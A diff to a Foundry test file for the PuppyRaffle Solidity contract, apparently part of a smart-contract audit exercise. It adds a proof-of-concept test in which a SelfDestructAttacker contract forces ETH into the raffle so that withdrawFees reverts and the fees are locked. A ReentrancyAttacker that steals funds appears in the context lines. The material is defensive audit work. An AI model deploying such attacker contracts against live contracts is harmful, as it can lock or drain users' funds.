@@ -311,6 +311,30 @@ contract PuppyRaffleTest is Test {
         vm.expectRevert("PuppyRaffle: There are currently players active!");
         puppyRaffle.withdrawFees();
     }
+
+    function test_WithdrawFeesSelfdestruct() public playersEntered {
+        // calling the first time selectWinner
+        vm.warp(block.timestamp + puppyRaffle.raffleStartTime() + puppyRaffle.raffleDuration());
+        vm.roll(block.number + 1);
+        vm.prank(playerOne);
+        puppyRaffle.selectWinner();
+
+        // Deploying the attacker contract, and funding it with some ETH
+        SelfDestructAttacker attacker = new SelfDestructAttacker(address(puppyRaffle));
+        vm.deal(address(attacker), 0.1 ether);
+        console.log("Initial Puppy Raffle balance:", address(puppyRaffle).balance);
+
+        // calling attack function
+        attacker.attack();
+
+        console.log("Ending Puppy Raffle balance:", address(puppyRaffle).balance);
+        console.log("Puppy Raffle totalFees:", puppyRaffle.totalFees());
+
+        // We expect withdrawFees to revert due to the failed check
+        vm.expectRevert("PuppyRaffle: There are currently players active!");
+        vm.prank(playerOne);
+        puppyRaffle.withdrawFees();
+    }
 }
 
 contract ReentrancyAttacker {
@@ -344,5 +368,17 @@ contract ReentrancyAttacker {
 
     receive() external payable {
         _stealMoney();
+    }
+}
+
+contract SelfDestructAttacker {
+    address immutable i_target;
+
+    constructor(address target) {
+        i_target = target;
+    }
+
+    function attack() external {
+        selfdestruct(payable(i_target));
     }
 }
